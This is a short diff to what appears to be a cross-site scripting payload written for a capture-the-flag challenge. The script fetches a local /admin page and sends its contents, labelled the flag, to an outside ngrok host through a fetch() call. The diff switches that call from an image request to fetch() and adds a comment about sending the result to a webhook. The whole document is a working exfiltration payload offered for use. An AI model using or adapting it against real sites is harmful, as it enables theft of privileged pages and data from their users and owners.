@@ -1,9 +1,10 @@
 <script>
-fetch('/admin')
-  .then(res => res.text())
+fetch('http://127.0.0.1:3000/admin')
+  .then(r => r.text())
   .then(flag => {
-    var i = new Image();
-    i.src = 'https://unrebuked-remotely-franco.ngrok-free.dev/flag?flag=' + encodeURIComponent(flag);
+     // Send the result to your webhook/Flask server!
+     fetch('https://unrebuked-remotely-franco.ngrok-free.dev/flag?flag=' + encodeURIComponent(flag));
   });
 </script>
+
 
